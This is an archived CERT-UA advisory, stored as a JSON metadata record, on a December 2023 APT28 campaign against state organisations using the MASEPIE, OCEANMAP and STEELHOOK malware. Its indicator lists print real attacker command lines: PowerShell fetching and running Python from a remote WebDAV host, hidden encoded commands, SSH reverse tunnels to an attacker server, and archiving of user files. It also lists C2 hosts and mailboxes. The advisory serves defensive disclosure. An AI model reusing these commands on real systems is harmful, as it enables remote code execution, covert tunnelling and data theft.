{
    "id": "59d496f1-23d2-424d-b344-66cefbbf3e7a",
    "created_at": "2024-01-03T02:07:02.431631Z",
    "updated_at": "2025-03-27T02:15:24.820372Z",
    "deleted_at": null,
    "sha1_hash": "655acdbba1095c8339c40f02d2af3d3da50d22c4",
    "title": "APT28: From Initial Damage to Domain Controller Threats in an Hour",
    "authors": "CERT-UA",
    "file_creation_date": "2024-01-02T03:01:11Z",
    "file_modification_date": "2024-01-02T03:01:11Z",
    "file_size": 2684353,
    "plain_text": "# CERT-UA\n\n**cert.gov.ua/article/6276894**\n\n## general information\n\n During December 15-25, 2023, several cases of distribution of e-mails with links to \"documents\" were discovered among state organizations, visiting which led to damage of computers with malicious programs.\n\n In the process of investigating the incidents, it was found that the mentioned links redirect the victim to a web resource where, with the help of JavaScript and features of the application protocol \"search\" (\"ms-search\") [1], a shortcut file is downloaded, the opening of which leads to the launch A PowerShell command designed to download from a remote (SMB) resource and run (open) a decoy document, as well as the Python programming language interpreter and the Client.py file classified as MASEPIE.\n\n Using MASEPIE, OPENSSH (for building a tunnel), STEELHOOK PowerShell scripts (stealing data from Chrome/Edge Internet browsers), and the OCEANMAP backdoor are loaded and launched on the computer. In addition, IMPACKET, SMBEXEC, etc. are created on the computer within an hour from the moment of the initial compromise, with the help of which network reconnaissance and attempts at further horizontal movement are carried out.\n\n According to the combination of tactics, techniques, procedures and tools, the activity is associated with the activities of the APT28 group. At the same time, it is obvious that the malicious plan also involves taking measures to develop a cyber attack on the entire information and communication system of the organization. Thus, the compromise of any computer can pose a threat to the entire network.\n\n It should be noted that cases of similar attacks have also been recorded in relation to Polish organizations.\n\n For reference:\n\n\n-----\n\n## OCEANMAP is a malicious program developed using the C# programming language. The main functionality consists in executing commands using cmd.exe. The IMAP protocol is used as a control channel. Commands, in base64-encoded form, are contained in message drafts (\"Drafts\") of the corresponding directories of electronic mailboxes; each of the drafts contains the name of the computer, the name of the user and the version of the OS. The results of executing commands are stored in the directory of incoming messages (\"INBOX\"). Implemented a mechanism for updating the configuration (command check interval, addresses and authentication data of mail accounts), which involves patching the backdoor executable and restarting the process. Persistence is ensured by creating a .URL file 'VMSearch.url' in the startup directory. MASEPIE is a malicious program developed using the Python programming language. The main functionality consists in uploading/unloading files and executing commands. The TCP protocol is used as a control channel. Data is encrypted using the AES-128- CBC algorithm; the key, which is a sequence of 16 arbitrary bytes, is generated at the beginning of the connection establishment. Backdoor persistence is ensured by creating the 'SysUpdate' key in the 'Run' branch of the OS registry, as well as by using the LNK file 'SystemUpdate.lnk' in the startup directory. STEELHOOK is a PowerShell script that provides the theft of Internet browser data (\"Login Data\", \"Local State\") and the DPAPI master key by sending them to the management server using an HTTP POST request in base64-encoded form.\n\n Indicators of cyber threats\n\n Files:\n\n\n-----\n\n```\n9724cecaa8ca38041ee9f2a42cc5a297\n4fa8caea8002cd2247c2d5fd15d4e76762a0f0cdb7a3c9de5b7f4d6b2ab34ec6 2.txt\n\n5f126b2279648d849e622e4be910b96c\n6bae493b244a94fd3b268ff0feb1cd1fbc7860ecf71b1053bf43eea88e578be9 2.ps1 (STEELHOOK)\n\n47f4b4d8f95a7e842691120c66309d5b\n18f891a3737bb53cd1ab451e2140654a376a43b2d75f6695f3133d47a41952b6 Client.py (MASEPIE)\n\n8d1b91e8fb68e227f1933cfab99218a4\n6d44532b1157ddc2e1f41df178ea9cbc896c19f79e78b3014073af2d8d9504fe VMSearch.sfx.exe\n\n6fdd416a768d04a1af1f28ecaa29191b\nfb2c0355b5c3adc9636551b3fd9a861f4b253a212507df0e346287110233dc23 VMSearch.exe\n(OCEANMAP)\n\n5db75e816b4cef5cc457f0c9e3fc4100\n24fd571600dcc00bf2bb8577c7e4fd67275f7d19d852b909395bebcbb1274e04 VMSearch.exe\n(OCEANMAP)\n\n6128d9bf34978d2dc7c0a2d463d1bcdd\n19d0c55ac466e4188c4370e204808ca0bc02bba480ec641da8190cb8aee92bdc KFP.311.152.2023.pdf\n.lnk\n\n825a12e2377dd694bbb667f862d60c43\n593583b312bf48b7748f4372e6f4a560fd38e969399cf2a96798e2594a517bf4\nKFP.311.152.2023.pdf.lnk\n\nacd9fc44001da67f1a3592850ec09cb7\nc22868930c02f2d6962167198fde0d3cda78ac18af506b57f1ca25ca5c39c50d Strategies of\nUkraine.pdf .lnk\n\n## Network:\n\n```\n\n-----\n\n```\n\\\\194[.]126.178.8@80\\webdav\\Docs\\231130 No. 581.pdf .lnk\n\n\\\\194[.]126.178.8@80\\webdav\\Docs\\231130 No. 581.pdf\n\n\\\\194[.]126.178.8@80\\webdav\\Python39\\Client[.]py\n\n\\\\194[.]126.178.8@80\\webdav\\Python39\\python[.]exe\n\n173[.]239.196.66 (X-Originating-IP)\n\n(tcp)://88[.]209.251.6:80\n\n194[.]126.178.8\n\n88[.]209.251.6\n\n74[.]124.219.71 (OCEANMAP C2)\n\nczyrqdnvpujmmjkfhhvs4knf1av02demj.oast[.]fun\n\nczyrqdnvpujmmjkfhhvsclx05sfi23bfr.oast[.]fun\n\nczyrqdnvpujmmjkfhhvsgapqr3hclnhhj.oast[.]fun\n\nczyrqdnvpujmmjkfhhvsvlaax17vd5r6v.oast[.]fun\n\nhXXp://194[.]126.178.8/webdav/wody[.]pdf\n\nhXXp://194[.]126.178.8/webdav/wody[.]zip\n\nhXXp://194.126.178.8/webdav/StrategyUa.pdf\n\nhXXp://194[.]126.178.8/webdav/231130N581[.]pdf\n\nhXXp://czyrqdnvpujmmjkfhhvsclx05sfi23bfr.oast[.]fun\n\nhXXp://czyrqdnvpujmmjkfhhvsgapqr3hclnhhj.oast[.]fun\n\nhXXp://czyrqdnvpujmmjkfhhvsvlaax17vd5r6v.oast[.]fun\n\nhXXp://czyrqdnvpujmmjkfhhvs4knf1av02demj.oast[.]fun\n\nhXXps://nas-files.firstcloudit[.]com/\n\nhXXps://ua-calendar.firstcloudit[.]com/\n\nhXXps://e-nas.firstcloudit[.]com/\n\njrb@bahouholdings.com (OCEANMAP C2)\n\nnas-files.firstcloudit[.]com\n\ne-nas.firstcloudit[.]com\n\nua-calendar.firstcloudit[.]com\n\nqasim.m@facadesolutionsuae.com (OCEANMAP C2)\n\nwebmail.facadesolutionsuae[.]com (OCEANMAP C2)\n\n## Hosts:\n\n```\n\n-----\n\n```\n%PROGRAMDATA%\\2.txt\n\n%PROGRAMDATA%\\python.zip\n\n%PROGRAMDATA%\\python\\python-3.10.0-embed-amd64\\Client.py\n\n%USERPROFILE%\\.ssh\\known_hosts\n\n%LOCALAPPDATA%\\11.zip\n\n%LOCALAPPDATA%\\Temp\\RarSFX0\\VMSearch.exe\n\n%LOCALAPPDATA%\\Temp\\RarSFX1\\VMSearch.exe\n\n%LOCALAPPDATA%\\Temp\\VMSearch.sfx.exe\n\n%LOCALAPPDATA%\\i.lnk\n\n%LOCALAPPDATA%\\key\n\n%LOCALAPPDATA%\\python.zip\n\n%LOCALAPPDATA%\\python\\python-3.10.0-embed-amd64\\Client.py\n\n%LOCALAPPDATA%\\python\\python-3.10.0-embed-amd64\\python.exe\n\n%LOCALAPPDATA%\\qz.zip\n\n%LOCALAPPDATA%\\s.lnk\n\n%LOCALAPPDATA%\\s.zip\n\n%LOCALAPPDATA%\\s2.zip\n\n%LOCALAPPDATA%\\s3.zip\n\n%LOCALAPPDATA%\\sys.zip\n\n%LOCALAPPDATA%\\t.lnk\n\n%LOCALAPPDATA%\\temp1.txt\n\n%LOCALAPPDATA%\\temp2.txt\n\n%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\SystemUpdate.lnk\n\n%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\VMSearch.url\n\nC:\\WINDOWS\\system32\\cmd.exe /c \"powershell.exe -c \"$a=Get-Content\n\"%LOCALAPPDATA%\\2.txt\";powershell.exe -windowstyle hidden -encodedCommand $a\"\"C:\\\nWindows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -w hid -nop -c\n\"%PROGRAMDATA%\\python\\python-3.10.0-embed-amd64\\python.exe\n%PROGRAMDATA%\\python\\python-3.10.0-embed-amd64. 0-embed-amd64\\Client.py\"\n\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -w hid -nop -c \"\n[system.Diagnostics.Process]::Start('msedge','http://194.126.178.8/webdav/\n231130N581.pdf'); \\\\194.126.178.8@80\\webdav\\Python39\\python.exe\n\\\\194.126.178.8@80\\webdav\\Python39\\Client.py\"\n\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -w hid -nop -c \"\n[system.Diagnostics.Process]::Start('msedge','http://194.126.178.8/webdav/\nwody.pdf'); \\\\194.126.178.8@80\\webdav\\Python39\\python.exe\n\\\\194.126.178.8@80\\webdav\\Python39\\Client.py\"\n\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -w hid -nop -c \"\n[system.Diagnostics.Process]::Start('msedge','http://194.126.178.8/webdav/\nStrategyUa.pdf'); \\\\194.126.178.8@80\\webdav\\Python39\\python.exe\n\\\\194.126.178.8@80\\webdav\\Python39\\Client.py\"\n\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -w hid -nop -c\n%LOCALAPPDATA%\\python\\python-3.10.0-embed-amd64\\python.exe\n%LOCALAPPDATA%\\python\\python- 3.10.0-embed-amd64\\Client.py\n\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -w hid -nop -c\n\\\\194.126.178.8@80\\webdav\\Python39\\python.exe \\\\194.126.178.8@80\\webdav\\Python39\\\nClient.py\n\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -windowstyle hidden encodedCommand\"==\"4AdABlAG4AdAAgAH0AOwAgAEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZA\nAA==\"4AdABlAG4AdAAgAH0AOwAgAEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZAAgAC0AVQByAGk\n AA==\"\n\n```\n\n-----\n\n```\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe windowstyle hidden\nencodedCommandQQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFMAeQBzAHQA\n\n\\\\194.126.178.8@80\\webdav\\Python39\\python.exe\n\\\\194.126.178.8@80\\webdav\\Python39\\Client.py\n\ncmd /C start powershell.exe -w hid -nop -c \"%LOCALAPPDATA%\\python\\python-3.10.0embed-amd64\\python.exe %LOCALAPPDATA%\\python\\python-3.10.0-embed-amd64\\ Client.py\"\n\npowershell -c start-process ssh.exe -windowstyle Hidden -ArgumentList \"-N -o\nServerAliveInterval=30 -p80 root@88.209.251.6 -R 88.209.251.6:10858 -i\n%LOCALAPPDATA%\\key -oPubkeyAcceptedKeyTypes=ssh-rsa - oStrictHostKeyChecking=no\" PassThru\n\npowershell -c start-process ssh.exe -windowstyle Hidden -ArgumentList \"-N -o\nServerAliveInterval=30 -p80 root@88.209.251.6 -R 88.209.251.6:10859 -i\n%LOCALAPPDATA%\\key -oPubkeyAcceptedKeyTypes=ssh-rsa - oStrictHostKeyChecking=no\" PassThru\n\npowershell.exe -c \"$a=Get-Content \"%PROGRAMDATA%\\2.txt\"; powershell.exe -windowstyle\nhidden -encodedCommand $a\"powershell.exe -c $a=Get-Content \"%PROGRAMDATA%\\2 .txt\";\npowershell.exe -windowstyle hidden -encodedCommand $a\n\npowershell.exe -c $a=Get-Content -Encoding 'Default' -Path\n\"%LOCALAPPDATA%\\temp.txt\";\"$a\"\n\npowershell.exe -c $a=Get-Content -Encoding 'String' -Path\n\"%LOCALAPPDATA%\\temp.txt\";\"$a\"\n\npowershell.exe -c $a=Get-Content -Encoding 'ascii' -Path\n\"%LOCALAPPDATA%\\temp.txt\";\"$a\"\n\npowershell.exe -c $a=Get-Content -Encoding 'oem' -Path \"%LOCALAPPDATA%\\temp.txt\";\"$a\"\n\npowershell.exe -c $a=Get-Content -Encoding 'oem' -Path\n\"%LOCALAPPDATA%\\temp.txt\";Compress-Archive -Force \"$a\" %LOCALAPPDATA%\\s.zip\n\npowershell.exe -c $a=Get-Content -Encoding 'oem' -Path \"%LOCALAPPDATA%\\temp.txt\";dir\n\"$a\"\n\npowershell.exe -c $a=Get-Content -Encoding 'oem' -Path\n\"%LOCALAPPDATA%\\temp1.txt\";Compress-Archive -Force \"$a\" %LOCALAPPDATA%\\s2.zip\n\npowershell.exe -c $a=Get-Content -Encoding 'oem' -Path\n\"%LOCALAPPDATA%\\temp2.txt\";Compress-Archive -Force \"$a\" %LOCALAPPDATA%\\s3.zip\n\npowershell.exe -c $a=Get-Content -Encoding 'oem' -Path \"%LOCALAPPDATA%\\temp2.txt\";dir\n\"$a\"\n\npowershell.exe -c $a=Get-Content -Encoding 'unicode' -Path\n\"%LOCALAPPDATA%\\temp.txt\";\"$a\"\n\npowershell.exe -c $a=Get-Content -Encoding 'utf32' -Path\n\"%LOCALAPPDATA%\\temp.txt\";\"$a\"\n\npowershell.exe -c $a=Get-Content -Encoding 'utf8' -Path\n\"%LOCALAPPDATA%\\temp.txt\";\"$a\"\n\npowershell.exe -c $a=Get-Content -Path \"%LOCALAPPDATA%\\temp.txt\";\"$a\"\n\npowershell.exe -c $a=Get-Content -Path \"%LOCALAPPDATA%\\temp.txt\";Compress-Archive Force \"$a\" %LOCALAPPDATA%\\s.zip\n\npowershell.exe -c Compress-Archive -Force %USERPROFILE%\\Desktop\\\n%LOCALAPPDATA%\\qz.zip\n\npowershell.exe -c Get-WinEvent -FilterHashtable @{logname=\"system\"; id=1129}\n\npowershell.exe -c Get-WinEvent -FilterHashtable @{logname=\"system\"; id=1501}\n\npowershell.exe -c dir /S %USERPROFILE% *.dat\n\npowershell.exe -c import-module ActiveDirectory; Get-AdDomainController\n\npowershell.exe -c net time /domain\n\npowershell.exe -c net time /domain:%DOMAIN%.local\n\n```\n\n-----\n\n```\npowershell.exe w hid nop c %LOCALAPPDATA%\\python\\python 3.10.0 embed\namd64\\python.exe %LOCALAPPDATA%\\python\\python-3.10.0-embed-amd64\\Client.py\n\npowershell.exe -w hid -nop -c Expand-Archive -Force %PROGRAMDATA%\\python.zip\n%PROGRAMDATA%\\python\n\npowershell.exe -w hid -nop -c start \"%APPDATA%\\Microsoft\\Windows\\Start\nMenu\\Programs\\Startup\\SystemUpdate.lnk\"\n\npowershell.exe -w hid -nop gpresult /z\n\npowershell.exe -w hid -nop gpupdate\n\npowershell.exe Compress-Archive -Force %USERPROFILE%\\Desktop\\ %LOCALAPPDATA%\\sys.zip\n\npowershell.exe Compress-Archive -Force %USERPROFILE%\\Desktop\\*.lnk\n%LOCALAPPDATA%\\11.zip\n\npowershell.exe Compress-Archive %USERPROFILE%\\Desktop %LOCALAPPDATA%\\sys.zip\n\npowershell.exe Expand-Archive -Force %LOCALAPPDATA%\\python.zip %LOCALAPPDATA%\\python\n\npowershell.exe Get-ADDomainController\n\npowershell.exe Get-Content %LOCALAPPDATA%\\i.lnk\n\npowershell.exe Get-DnsClientServerAddress\n\npowershell.exe Get-NetAdapter\n\npowershell.exe Get-NetAdapterBinding | Where-Object ComponentID -EQ 'ms_tcpip6'\n\npowershell.exe Get-NetIPConfiguration -All\n\npowershell.exe Resolve-DNSName %DC%\n\npowershell.exe Resolve-DNSName %DOMAIN%.local\n\npowershell.exe Test-NetConnection %FS% -Port 445 -v\n\npowershell.exe [System.Directoryservices.Activedirectory.Domain]::GetCurrentDomain()\n\npowershell.exe date\n\npowershell.exe dir %USERPROFILE%\\Desktop\n\npowershell.exe ipconfig /flushdns\n\npowershell.exe net start dnscache\n\npowershell.exe net stop dnscache\n\n## Graphic images\n\n```\n\n-----\n\n## Fig. 1 Example of a chain of damage\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/s2uqsgl0krjgy2q806x3vy0hx6jfjem8"
    ],
    "report_names": [
        "CERT-UA-8399(12-28-2023)"
    ],
    "threat_actors": [
        {
            "id": "e3767160-695d-4360-8b2e-d5274db3f7cd",
            "created_at": "2022-10-25T16:47:55.914348Z",
            "updated_at": "2025-03-27T02:05:17.411172Z",
            "deleted_at": null,
            "main_name": "IRON TWILIGHT",
            "aliases": [
                "ATK5 ",
                "Blue Athena ",
                "BlueDelta ",
                "FROZENLAKE ",
                "Fancy Bear ",
                "Fighting Ursa ",
                "Forest Blizzard ",
                "GRAPHITE ",
                "Group 74 ",
                "PawnStorm ",
                "STRONTIUM ",
                "Sednit ",
                "Snakemackerel ",
                "Sofacy ",
                "TG-4127 ",
                "Tsar Team ",
                "APT28 "
            ],
            "source_name": "Secureworks:IRON TWILIGHT",
            "tools": [
                " Downdelph",
                " Drovorub",
                " EVILTOSS",
                " HIDEDRV",
                " Headlace",
                " LoJack",
                " Powershell Empire",
                " SCONATO",
                " SEDUPLOADER",
                " SHARPFRONT",
                " Scaramouche",
                " Sedkit Exploit Kit",
                " Sofacy downloader",
                " X-Agent",
                " X-Tunnel",
                " Zebrocy",
                " reGeorg",
                "DEALERSCHOICE"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "730dfa6e-572d-473c-9267-ea1597d1a42b",
            "created_at": "2023-01-06T13:46:38.389985Z",
            "updated_at": "2025-03-27T02:00:02.821388Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "FROZENLAKE",
                "BlueDelta",
                "SNAKEMACKEREL",
                "TG-4127",
                "ITG05",
                "TA422",
                "Fancy Bear",
                "FANCY BEAR",
                "Sednit",
                "IRON TWILIGHT",
                "G0007",
                "Sofacy",
                "Forest Blizzard",
                "GruesomeLarch",
                "Pawn Storm",
                "Tsar Team",
                "STRONTIUM",
                "ATK5",
                "Blue Athena",
                "APT-C-20",
                "Group 74",
                "SIG40",
                "Grizzly Steppe",
                "Fighting Ursa",
                "T-APT-12",
                "UAC-0028"
            ],
            "source_name": "MISPGALAXY:APT28",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ae320ed7-9a63-42ed-944b-44ada7313495",
            "created_at": "2022-10-25T15:50:23.671663Z",
            "updated_at": "2025-03-27T02:00:55.518748Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "APT28",
                "IRON TWILIGHT",
                "SNAKEMACKEREL",
                "Group 74",
                "Sednit",
                "Sofacy",
                "Pawn Storm",
                "Fancy Bear",
                "STRONTIUM",
                "Tsar Team",
                "Threat Group-4127",
                "TG-4127",
                "Forest Blizzard",
                "FROZENLAKE"
            ],
            "source_name": "MITRE:APT28",
            "tools": [
                "Wevtutil",
                "certutil",
                "Forfiles",
                "DealersChoice",
                "Mimikatz",
                "ADVSTORESHELL",
                "Komplex",
                "HIDEDRV",
                "JHUHUGIT",
                "Koadic",
                "Winexe",
                "XTunnel",
                "Drovorub",
                "CORESHELL",
                "OLDBAIT",
                "Downdelph",
                "XAgentOSX",
                "USBStealer",
                "Zebrocy",
                "Fysbis",
                "LoJax"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1704247622,
    "ts_updated_at": 1743041724,
    "ts_creation_date": 1704164471,
    "ts_modification_date": 1704164471,
    "files": {
        "pdf": "https://archive.orkl.eu/655acdbba1095c8339c40f02d2af3d3da50d22c4.pdf",
        "text": "https://archive.orkl.eu/655acdbba1095c8339c40f02d2af3d3da50d22c4.txt",
        "img": "https://archive.orkl.eu/655acdbba1095c8339c40f02d2af3d3da50d22c4.jpg"
    }
}